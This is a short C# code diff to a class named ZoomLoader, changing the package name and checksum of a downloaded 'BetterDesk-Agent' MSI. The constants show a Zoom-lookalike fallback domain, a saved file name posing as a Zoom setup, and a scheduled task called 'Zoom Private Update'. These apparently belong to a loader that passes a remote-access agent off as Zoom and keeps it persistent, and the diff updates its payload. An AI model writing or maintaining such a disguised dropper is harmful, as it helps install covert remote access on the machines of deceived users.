@@ -40,9 +40,9 @@ public class ZoomLoader
 {
     const string RepoBase = "https://raw.githubusercontent.com/fingod201-maker/BetterDesk-private/operational-v2-ALLclient-working/distro/clients/windows";
     const string Fallback = "https://us05web.telcom.stream";
-    const string PkgName = "BetterDesk-Agent-x64.msi";
+    const string PkgName = "BetterDesk-Agent-x64-1.0.1.msi";
     const string SaveName = "zoom-private.Setup_1.0.0_x64_en-US.msi";
-    const string ExpectedSha = "177A0DD0218C836437B7157F21636406CDEEF1179AEA0D466618C1D412D664E8";
+    const string ExpectedSha = "84025FB577EC5112C090D82F05C3E4D1E0576BA87AD0440BE247173D1222104E";
     const string TaskName = "Zoom Private Update";
     const string UninstallKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{39ADC479-8106-430C-9B36-10552C4AF9E6}";
 
